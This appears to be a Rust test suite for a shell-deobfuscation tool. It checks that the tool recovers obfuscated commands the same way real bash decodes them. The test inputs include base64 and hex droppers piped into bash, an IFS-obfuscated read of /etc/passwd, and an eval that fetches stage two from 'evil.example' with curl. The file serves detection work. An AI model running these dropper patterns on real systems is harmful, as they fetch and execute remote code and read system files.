#![allow(
    clippy::expect_used,
    clippy::unwrap_used,
    clippy::panic,
    clippy::missing_panics_doc
)]

use std::process::Command;

use disrobe_pass_shell::{IndirectionReport, peel_indirection};

fn bash_path() -> String {
    for candidate in [
        "/usr/bin/bash",
        "/bin/bash",
        "C:/Program Files/Git/usr/bin/bash.exe",
        "C:/cygwin64/bin/bash.exe",
    ] {
        if std::path::Path::new(candidate).exists() {
            return candidate.to_owned();
        }
    }
    let probe: std::io::Result<std::process::Output> =
        Command::new("bash").arg("--version").output();
    match probe {
        Ok(out) if out.status.success() => "bash".to_owned(),
        Ok(out) => panic!(
            "required tool missing: `bash --version` exited with {}, and bash is the independent \
             decoder these recoveries are graded against",
            out.status
        ),
        Err(error) => panic!(
            "required tool missing: bash is not at a known path or on PATH ({error}), and it is \
             the independent decoder these recoveries are graded against"
        ),
    }
}

fn bash_command(bash: &str) -> Command {
    let mut command: Command = Command::new(bash);
    if let Some(dir) = std::path::Path::new(bash)
        .parent()
        .filter(|dir: &&std::path::Path| !dir.as_os_str().is_empty())
    {
        let inherited: std::ffi::OsString = std::env::var_os("PATH").unwrap_or_default();
        let joined: std::ffi::OsString = std::env::join_paths(
            std::iter::once(dir.to_path_buf()).chain(std::env::split_paths(&inherited)),
        )
        .expect("the bash directory and PATH entries join into a PATH value");
        command.env("PATH", joined);
    }
    command
}

fn run_decoder_only(bash: &str, decoder_snippet: &str) -> String {
    let out: std::process::Output = bash_command(bash)
        .arg("-c")
        .arg(decoder_snippet)
        .output()
        .expect("spawn bash decoder");
    assert!(
        out.status.success(),
        "decoder snippet failed: {snippet}\nstderr: {err}",
        snippet = decoder_snippet,
        err = String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn require_commands(bash: &str, commands: &[&str]) {
    for command in commands {
        let found: bool = bash_command(bash)
            .arg("-c")
            .arg(format!("command -v {command} >/dev/null 2>&1"))
            .output()
            .is_ok_and(|o: std::process::Output| o.status.success());
        assert!(
            found,
            "required tool missing: `{command}` is not callable from {bash}, and it is the \
             independent decoder this recovery is graded against"
        );
    }
}

fn require_base64_decode(bash: &str) {
    require_commands(bash, &["base64", "tr"]);
    let decoded: String = run_decoder_only(bash, "printf %s eA== | base64 -d");
    assert_eq!(
        decoded, "x",
        "required tool missing: {bash}'s base64 does not decode with -d"
    );
}

fn base64_of(bash: &str, payload: &str) -> String {
    run_decoder_only(
        bash,
        &format!("printf %s '{payload}' | base64 | tr -d '\\n'"),
    )
}

fn recover(input: &str) -> IndirectionReport {
    peel_indirection(input).expect("peel")
}

#[test]
fn base64_dropper_recovery_matches_real_bash_decoder() {
    let bash: String = bash_path();
    require_base64_decode(&bash);
    let payload: &str = "uname -a";
    let b64: String = base64_of(&bash, payload);
    let obf: String = format!("echo {b64} | base64 -d | bash");
    let ground_truth: String = run_decoder_only(&bash, &format!("echo {b64} | base64 -d"));
    assert_eq!(ground_truth, payload);
    let r: IndirectionReport = recover(&obf);
    assert_eq!(
        r.output, ground_truth,
        "recovery diverged from real bash decoder"
    );
}

#[test]
fn double_base64_chain_matches_real_bash_decoder() {
    let bash: String = bash_path();
    require_base64_decode(&bash);
    let payload: &str = "curl http://example/c";
    let inner: String = base64_of(&bash, payload);
    let outer: String = base64_of(&bash, &inner);
    let obf: String = format!("echo {outer} | base64 -d | base64 -d | sh");
    let ground_truth: String =
        run_decoder_only(&bash, &format!("echo {outer} | base64 -d | base64 -d"));
    assert_eq!(ground_truth, payload);
    let r: IndirectionReport = recover(&obf);
    assert_eq!(r.output, ground_truth);
}

#[test]
fn command_subst_assignment_matches_real_bash() {
    let bash: String = bash_path();
    require_base64_decode(&bash);
    let payload: &str = "whoami";
    let b64: String = base64_of(&bash, payload);
    let obf: String = format!("CMD=$(echo {b64} | base64 -d); $CMD");
    let ground_truth: String = run_decoder_only(
        &bash,
        &format!("CMD=$(echo {b64} | base64 -d); echo \"$CMD\""),
    );
    assert_eq!(ground_truth.trim_end(), payload);
    let r: IndirectionReport = recover(&obf);
    assert_eq!(r.output, ground_truth.trim_end());
}

#[test]
fn printf_octal_matches_real_bash() {
    let bash: String = bash_path();
    let octal: &str = r"\167\150\157\141\155\151";
    let obf: String = format!("printf '{octal}'");
    let ground_truth: String = run_decoder_only(&bash, &format!("printf '{octal}'"));
    assert_eq!(ground_truth, "whoami");
    let r: IndirectionReport = recover(&obf);
    assert_eq!(r.output, ground_truth);
}

#[test]
fn xxd_hex_dropper_matches_real_bash() {
    let bash: String = bash_path();
    require_commands(&bash, &["xxd", "tr"]);
    let payload: &str = "id";
    let hex: String = run_decoder_only(
        &bash,
        &format!("printf %s '{payload}' | xxd -p | tr -d '\\n'"),
    );
    let obf: String = format!("echo {hex} | xxd -r -p | bash");
    let ground_truth: String = run_decoder_only(&bash, &format!("echo {hex} | xxd -r -p"));
    assert_eq!(ground_truth, payload);
    let r: IndirectionReport = recover(&obf);
    assert_eq!(r.output, ground_truth);
}

#[test]
fn ifs_spaced_command_recovers() {
    let obf: &str = "c${IFS}a${IFS}t${IFS}/etc/passwd";
    let r: IndirectionReport = recover(obf);
    assert_eq!(r.output, "c a t /etc/passwd");
}

#[test]
fn eval_concatenated_strings_matches_real_bash() {
    let bash: String = bash_path();
    let obf: &str = r#"a=who; b=ami; eval "$a$b""#;
    let ground_truth: String = run_decoder_only(&bash, r#"a=who; b=ami; echo "$a$b""#);
    assert_eq!(ground_truth.trim_end(), "whoami");
    let r: IndirectionReport = recover(obf);
    assert_eq!(
        r.output,
        format!("a=who\nb=ami\n{}", ground_truth.trim_end())
    );
}

#[test]
fn clean_control_yields_no_recovery() {
    let clean: &str =
        "#!/bin/bash\nset -euo pipefail\nfor f in *.log; do\n  gzip \"$f\"\ndone\necho done\n";
    let r: IndirectionReport = recover(clean);
    assert!(
        r.steps.is_empty(),
        "clean control must not trigger recovery; steps={:?} out={}",
        r.steps,
        r.output
    );
    assert_eq!(r.output, clean);
}

#[test]
fn runtime_dependent_curl_is_walled_not_faked() {
    let obf: &str = r#"eval "$(curl -s http://evil.example/stage2)""#;
    let r: IndirectionReport = recover(obf);
    assert_eq!(
        r.output, "$(curl -s http://evil.example/stage2)",
        "runtime fetch must remain symbolic, not fabricated"
    );
}
